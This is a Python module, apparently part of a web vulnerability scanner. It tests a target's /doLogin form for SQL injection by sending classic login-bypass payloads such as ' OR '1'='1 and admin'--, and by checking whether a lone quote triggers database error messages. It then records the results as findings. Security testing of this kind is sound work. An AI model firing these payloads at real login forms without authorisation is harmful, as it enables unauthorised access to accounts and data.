from modules.auth import attempt_login
from modules.finding import Finding
from modules.http_client import HttpClient


class SQLInjection:
    def __init__(self, target):
        self.target = target

    def try_login(self, payload):
        client = HttpClient(self.target)
        success, _ = attempt_login(client, payload, "anything")
        return success


    def check_error_based(self):
        print("\n--- Error-based SQL Injection Testing ---")

        sql_errors = [
            "sqlexception",
            "syntax error",
            "unclosed quotation",
            "ora-",
            "you have an error in your sql syntax",
            "odbc",
            "sql server",
        ]

        fields = ["uid", "passw"]
        findings = []

        for field in fields:
            client = HttpClient(self.target)
            data = {"uid": "test", "passw": "test", "btnSubmit": "Login"}
            data[field] = "'"
            response = client.post("/doLogin", data=data)
            body = response.text.lower()

            if any(error in body for error in sql_errors):
                print(f"    [VULNERABLE] SQL error triggered in field: {field}")
                findings.append(Finding(
                    check="SQLi",
                    severity="HIGH",
                    title=f"Error-based SQL injection in field: {field}",
                    evidence=f"A single quote in the {field} field triggered a database error in the response"
                ))
            else:
                print(f"    [SAFE]       No SQL error in field: {field}")

        return findings

    def run(self):
        print("\n--- SQL Injection Testing ---")

        payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' OR 1=1--",
        ]

        bypass_findings = []

        for payload in payloads:
            success = self.try_login(payload)

            if success:
                print(f"    [VULNERABLE] Login bypassed with: {payload}")
                bypass_findings.append(Finding(
                    check="SQLi",
                    severity="HIGH",
                    title="Login bypass via SQL injection",
                    evidence=f"Payload {payload} bypassed the login form (302 + authenticated page)"
                ))
            else:
                print(f"    [SAFE]       Did not work: {payload}")

        print(f"\n[SUMMARY] {len(bypass_findings)}/{len(payloads)} payloads bypassed login")
        if bypass_findings:
            print("    SQL injection vulnerability confirmed on login form!")
        findings = bypass_findings + self.check_error_based()

        if not findings:
            findings.append(Finding(
                check="SQLi",
                severity="SAFE",
                title="No SQL injection found",
                evidence="No payload bypassed login and no database errors were triggered"
            ))

        print("\n--- SQL Injection Testing Complete ---")
        return findings